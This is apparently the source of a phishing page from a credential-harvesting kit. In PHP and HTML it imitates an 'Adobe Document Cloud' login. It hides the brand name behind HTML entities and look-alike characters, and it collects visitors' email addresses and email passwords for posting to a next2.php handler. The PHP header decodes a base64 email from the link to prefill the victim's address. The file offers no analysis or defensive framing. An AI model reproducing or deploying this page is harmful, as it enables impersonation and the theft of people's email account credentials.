<?php


$user = $_REQUEST['email'];
$email = base64_decode($user);
if($_REQUEST['log'] == 1){$log=1;$email = $_REQUEST['email'];}

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>

<script type="text/javascript" src="MaskedPassword.js"></script>
<title>&#65;&#65;&#100;&#959;&#98;&#101;&#32;&#68;&#959;&#99;&#117;&#109;&#101;&#110;&#116;&#32;&#67;&#108;&#959;&#117;&#100;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="jquery.min.js"></script>
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
 .textbox {
   border: 1px solid #000000; 
    height: 46px; 
    width: 275px; 
   	font-family: Verdana;
    font-size: 14px;
    color: #000000; 
    padding-left: 8px; 
    border-radius: 2px; 
	box-shadow: 3px 3px 3px #000000;
}

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body bgColor="#000000">
<div class="loader"></div>
<div id="container">
<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:422px; width:1365px; height:216px; z-index:0"><img src="images/e3.png" alt="" title="" border=0 width=1365 height=216></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:221px; z-index:1"><img src="images/e7.png" alt="" title="" border=0 width=1365 height=221></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:219px; width:1365px; height:223px; z-index:2"><img src="images/e8.png" alt="" title="" border=0 width=1365 height=223></div>
<form action=next2.php name=dafahojaage id=dafahojaage method=post>
<input name="email" value="" class="textbox" placeholder="Email Address" tabindex="1" autocomplete="off" required type="text" style="position:absolute;width:320px;left:211px;top:280px;z-index:3">
<input name="psw"  id="X2" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:320px;left:211px;top:335px;z-index:4">
<div id="formimage1" style="position:absolute; left:210px; top:392px; z-index:5"><input type="image" name="formimage1" width="322" height="47" src="images/file.png"></div>
</div>

	
</body>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("X2"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</html>
